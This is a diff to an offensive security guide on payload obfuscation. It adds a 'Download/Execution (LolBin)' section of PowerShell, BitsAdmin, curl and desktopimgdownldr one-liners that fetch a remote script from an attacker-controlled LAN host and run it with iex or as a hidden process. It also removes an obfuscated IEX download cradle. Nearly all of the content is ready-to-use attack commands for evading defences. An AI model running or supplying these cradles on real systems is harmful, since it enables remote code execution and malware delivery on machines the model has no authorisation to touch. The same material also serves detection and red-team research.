@@ -63,6 +63,9 @@
 [3] [Powershell Obfuscation Technics (psh-ps1)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation-psh-ps1)<br />
 [4] [VBScript Obfuscation Technics (vba-vbs)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#vbscript-obfuscation-technics-vba-vbs)<br />
 [5] [C Obfuscation Technics (c-exe)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-obfuscation-technics-c-exe)<br />
+
+[?] [Download/Execution (LolBin)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-obfuscation-technics-c-exe)<br />
+
 [6] [AMSI Bypass Technics (COM/REG)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#amsi-comreg-bypass)<br />
 [7] [Bypass the scan engine (sandbox)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-sandbox)<br />
 [8] [Obfuscating msfvenom template (psh-cmd)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#obfuscating-the-metasploit-template-psh-cmd)<br />
@@ -1105,18 +1108,6 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ![var declaration success](http://i65.tinypic.com/2hx85g3.jpg)
 
-      [another way]
-      ## Obfuscating IEX (In PS Prompt)
-      & ('i'+'ex') (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
-      
-![obf2](https://user-images.githubusercontent.com/23490060/71784124-b17e0b80-2fe7-11ea-8593-a6ba045875c3.png)
-      
-      ## Obfuscating IEX (In CMD Prompt)
-      cmd /c powershell "& ('i'+'ex')" (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
-
-![obf1](https://user-images.githubusercontent.com/23490060/71784122-ae831b00-2fe7-11ea-8140-a6e1ab8d32f0.png)
-
-
 ---
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
@@ -2140,6 +2131,46 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ![C obfuscation](http://i63.tinypic.com/1z1qmxf.png)
 `HINT: Remmenber that the above template.c was compiled using the -trigraphs GCC switch`
+
+---
+
+[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
+
+---
+
+<br /><br /><br /><br />
+
+## Download/Execution (LolBin)
+
+<br />
+
+COM Donwloaders<br />
+
+      $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+
+      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+
+      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();$h.responseText > $env:tmp\hello.ps1
+
+      $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
+
+BitsAdmin Downloaders<br />
+
+      powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
+
+      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\\hello.ps1'
+
+      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko  http://192.168.1.73/hello.ps1 $env:tmp\\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\\hello.ps1'
+
+Curl Downloaders<br />
+
+      cmd /R curl.exe -s http://192.168.1.73/hello.ps1 -o %tmp%\hello.ps1 -u pedro:s3cr3t
+
+      cmd /R curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/venom.sh -o %tmp%\venom.sh -u pedro:s3cr3t
+
+desktopimgdownldr Downloaders<br />
+
+      set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
 
 ---
 
